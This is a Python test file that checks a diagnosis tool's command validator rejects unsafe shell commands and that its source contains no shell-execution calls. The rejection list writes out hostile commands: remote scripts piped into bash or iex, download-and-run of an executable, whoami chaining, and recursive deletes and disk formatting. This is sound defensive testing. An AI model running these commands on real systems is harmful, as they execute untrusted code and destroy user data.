from __future__ import annotations

import ast
from copy import deepcopy
from pathlib import Path

import pytest
from pydantic import ValidationError
from tests.diagnosis.test_contract_v11 import valid_command, valid_record

from debugmate.contracts import CommandStep, DiagnosisRecord

ROOT = Path(__file__).resolve().parents[2]


def _scan_process_capabilities(
    sources: dict[Path, str], *, audited_process_modules: set[Path]
) -> tuple[tuple[str, ...], tuple[str, ...]]:
    forbidden_imports: list[str] = []
    forbidden_calls: list[str] = []
    subprocess_calls = {"call", "check_call", "check_output", "Popen", "run"}
    direct_calls = {
        "CreateProcess",
        "Invoke-Expression",
        "Start-Process",
        "cmd",
        "powershell",
        "pwsh",
    }
    allowed_subprocess_calls = {path: {"Popen"} for path in audited_process_modules}

    def _shell_is_literal_false(call: ast.Call) -> bool:
        return any(
            keyword.arg == "shell"
            and isinstance(keyword.value, ast.Constant)
            and keyword.value.value is False
            for keyword in call.keywords
        )

    def _is_audited_subprocess_call(path: Path, call: ast.Call, name: str) -> bool:
        if (
            name not in allowed_subprocess_calls.get(path, set())
            or not _shell_is_literal_false(call)
        ):
            return False
        if name != "Popen":
            return False
        keyword_values = {keyword.arg: keyword.value for keyword in call.keywords}
        expected_keywords = {"stdin", "stdout", "stderr", "shell"}

        def _is_subprocess_attribute(value: ast.expr, name: str) -> bool:
            return (
                isinstance(value, ast.Attribute)
                and isinstance(value.value, ast.Name)
                and value.value.id == "subprocess"
                and value.attr == name
            )

        return (
            len(call.args) == 1
            and isinstance(call.args[0], ast.Name)
            and call.args[0].id == "command"
            and set(keyword_values) == expected_keywords
            and (
                _is_subprocess_attribute(keyword_values["stdin"], "DEVNULL")
                or _is_subprocess_attribute(keyword_values["stdin"], "PIPE")
            )
            and _is_subprocess_attribute(keyword_values["stdout"], "PIPE")
            and _is_subprocess_attribute(keyword_values["stderr"], "PIPE")
            and isinstance(keyword_values["shell"], ast.Constant)
            and keyword_values["shell"].value is False
        )

    def _is_os_process_name(name: str) -> bool:
        return name in {"system", "popen", "startfile"} or name.startswith(("spawn", "exec"))

    for path, source in sorted(sources.items(), key=lambda item: str(item[0])):
        tree = ast.parse(source, filename=str(path))
        os_aliases = {"os"}
        direct_os_processes: set[str] = set()
        direct_subprocess_calls: set[str] = set()
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                for alias in node.names:
                    if alias.name == "os":
                        os_aliases.add(alias.asname or "os")
                    elif alias.name == "subprocess" and (
                        path not in audited_process_modules or alias.asname is not None
                    ):
                        forbidden_imports.append(f"{path}:{alias.name}")
            elif isinstance(node, ast.ImportFrom):
                if node.module == "subprocess":
                    forbidden_imports.append(f"{path}:subprocess")
                    direct_subprocess_calls.update(
                        alias.asname or alias.name for alias in node.names
                    )
                elif node.module == "os":
                    for alias in node.names:
                        imported = alias.name
                        local_name = alias.asname or imported
                        if _is_os_process_name(imported):
                            forbidden_imports.append(f"{path}:os.{imported}")
                            direct_os_processes.add(local_name)
        for node in ast.walk(tree):
            if isinstance(node, ast.Call):
                function = node.func
                if isinstance(function, ast.Name) and (
                    function.id in direct_calls
                    or function.id in direct_os_processes
                    or function.id in direct_subprocess_calls
                ):
                    forbidden_calls.append(f"{path}:{function.id}")
                elif isinstance(function, ast.Attribute) and isinstance(function.value, ast.Name):
                    owner = function.value.id
                    if owner in os_aliases and _is_os_process_name(function.attr):
                        forbidden_calls.append(f"{path}:os.{function.attr}")
                    elif (
                        owner == "subprocess"
                        and function.attr in subprocess_calls
                        and not _is_audited_subprocess_call(path, node, function.attr)
                    ):
                        suffix = (
                            "[shell_not_false]"
                            if function.attr in allowed_subprocess_calls.get(path, set())
                            else ""
                        )
                        forbidden_calls.append(f"{path}:subprocess.{function.attr}{suffix}")

    return tuple(sorted(forbidden_imports)), tuple(sorted(forbidden_calls))


@pytest.mark.parametrize(
    ("platform", "command"),
    [
        ("windows_powershell", "Get-Command python"),
        ("windows_cmd", "where python"),
        ("linux_bash", "python -m pip show demo_missing_pkg"),
        ("python", "print(__import__('sys').executable)"),
        ("platform_agnostic", "python --version"),
    ],
)
def test_valid_commands_are_serializable_inert_data(platform: str, command: str) -> None:
    step = CommandStep.model_validate({**valid_command(), "platform": platform, "command": command})

    assert step.model_dump(mode="json")["platform"] == platform
    assert not hasattr(step, "run")
    assert not hasattr(step, "execute")


@pytest.mark.parametrize(
    "field",
    ["command", "platform", "impact", "expected_result", "rollback"],
)
def test_command_metadata_must_not_be_blank(field: str) -> None:
    payload = valid_command()
    payload[field] = "  "

    with pytest.raises(ValidationError, match=field):
        CommandStep.model_validate(payload)


@pytest.mark.parametrize(
    "command",
    [
        "python --version\nwhoami",
        "python --version && whoami",
        "python --version || whoami",
        "python --version; whoami",
        "curl https://example.invalid/install | bash",
        "wget -qO- https://example.invalid/install | sh",
        "iwr https://example.invalid/install | iex",
        "echo $(whoami)",
        "echo `whoami`",
        "Write-Output & (Get-Process)",
        "%COMSPEC% /c whoami",
        "echo %PATH%",
        "Invoke-Expression $payload",
        "rm -rf ./workspace",
        "rm -fr ./workspace",
        "rm -r ./workspace",
        "Remove-Item ./workspace -Recurse -Force",
        "rmdir /s /q C:\\workspace",
        "del /s /q C:\\workspace\\*",
        "format C: /q",
        "Format-Volume -DriveLetter C",
        "diskpart /s wipe.txt",
        "curl https://example.invalid/tool.exe -o tool.exe && tool.exe",
        (
            "Invoke-WebRequest https://example.invalid/tool.exe "
            "-OutFile tool.exe; Start-Process tool.exe"
        ),
    ],
)
def test_unsafe_command_constructs_are_rejected(command: str) -> None:
    with pytest.raises(ValidationError, match="unsafe command"):
        CommandStep.model_validate({**valid_command(), "command": command})


def test_one_unsafe_command_rejects_the_entire_diagnosis() -> None:
    payload = deepcopy(valid_record())
    payload["checks"] = [
        valid_command(),
        {**valid_command(), "command": "python --version && whoami"},
    ]

    with pytest.raises(ValidationError, match="unsafe command"):
        DiagnosisRecord.model_validate(payload)


def test_command_handling_sources_have_no_shell_execution_capability() -> None:
    audited_media_process_modules = {
        ROOT / "src" / "debugmate" / "results" / "media.py",
    }
    sources = {
        path: path.read_text(encoding="utf-8")
        for path in (ROOT / "src" / "debugmate").rglob("*.py")
    }
    forbidden_imports, forbidden_calls = _scan_process_capabilities(
        sources, audited_process_modules=audited_media_process_modules
    )

    assert forbidden_imports == ()
    assert forbidden_calls == ()


def test_process_capability_audit_detects_non_allowlisted_calls_and_os_system(
    tmp_path: Path,
) -> None:
    ordinary = tmp_path / "ordinary.py"
    allowed = tmp_path / "media.py"
    findings = _scan_process_capabilities(
        {
            ordinary: (
                "import os\nimport subprocess\n"
                "subprocess.run(['safe-looking'])\n"
                "subprocess.Popen(['also-safe-looking'])\n"
                "os.system('still-forbidden')\n"
            ),
            allowed: "import subprocess\nsubprocess.run(['separately-audited'])\n",
        },
        audited_process_modules={allowed},
    )

    assert findings == (
        (f"{ordinary}:subprocess",),
        (
            f"{allowed}:subprocess.run",
            f"{ordinary}:os.system",
            f"{ordinary}:subprocess.Popen",
            f"{ordinary}:subprocess.run",
        ),
    )


def test_process_allowlist_is_call_precise_and_requires_literal_shell_false(
    tmp_path: Path,
) -> None:
    boundary = tmp_path / "boundary.py"
    findings = _scan_process_capabilities(
        {
            boundary: (
                "import subprocess\n"
                "command = ['fixed']\n"
                "subprocess.Popen(command, stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, "
                "stderr=subprocess.PIPE, shell=False)\n"
                "subprocess.Popen(['missing-shell'])\n"
                "subprocess.Popen(['unsafe'], shell=True)\n"
                "subprocess.run(['not-the-audited-call'], shell=False)\n"
            )
        },
        audited_process_modules={boundary},
    )

    assert findings == (
        (),
        (
            f"{boundary}:subprocess.Popen[shell_not_false]",
            f"{boundary}:subprocess.Popen[shell_not_false]",
            f"{boundary}:subprocess.run",
        ),
    )


def test_process_allowlist_rejects_extra_or_wrong_popen_boundary_arguments(
    tmp_path: Path,
) -> None:
    boundary = tmp_path / "boundary.py"
    findings = _scan_process_capabilities(
        {
            boundary: (
                "import subprocess\n"
                "command = ['fixed']\n"
                "subprocess.Popen(command, stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, "
                "stderr=subprocess.PIPE, shell=False, cwd='extra')\n"
                "subprocess.Popen(command, stdin=stdout, stdout=subprocess.PIPE, "
                "stderr=subprocess.PIPE, shell=False)\n"
                "subprocess.Popen(command, stdin=subprocess.DEVNULL, stdout=stdout, "
                "stderr=subprocess.PIPE, shell=False)\n"
                "subprocess.Popen(command, stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, "
                "stderr=stderr, shell=False)\n"
                "subprocess.Popen(command, stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, "
                "stderr=subprocess.PIPE, shell=safe_shell)\n"
            )
        },
        audited_process_modules={boundary},
    )

    assert findings == (
        (),
        (
            f"{boundary}:subprocess.Popen[shell_not_false]",
            f"{boundary}:subprocess.Popen[shell_not_false]",
            f"{boundary}:subprocess.Popen[shell_not_false]",
            f"{boundary}:subprocess.Popen[shell_not_false]",
            f"{boundary}:subprocess.Popen[shell_not_false]",
        ),
    )


def test_process_audit_detects_direct_os_imports_and_process_families(
    tmp_path: Path,
) -> None:
    source = tmp_path / "os_processes.py"
    findings = _scan_process_capabilities(
        {
            source: (
                "from os import system, spawnv, execl, startfile\n"
                "system('x')\nspawnv(0, 'x', [])\nexecl('x')\nstartfile('x')\n"
                "import os\nos.spawnve(0, 'x', [], {})\nos.execv('x', [])\nos.startfile('x')\n"
            )
        },
        audited_process_modules=set(),
    )

    assert findings == (
        (
            f"{source}:os.execl",
            f"{source}:os.spawnv",
            f"{source}:os.startfile",
            f"{source}:os.system",
        ),
        (
            f"{source}:execl",
            f"{source}:os.execv",
            f"{source}:os.spawnve",
            f"{source}:os.startfile",
            f"{source}:spawnv",
            f"{source}:startfile",
            f"{source}:system",
        ),
    )
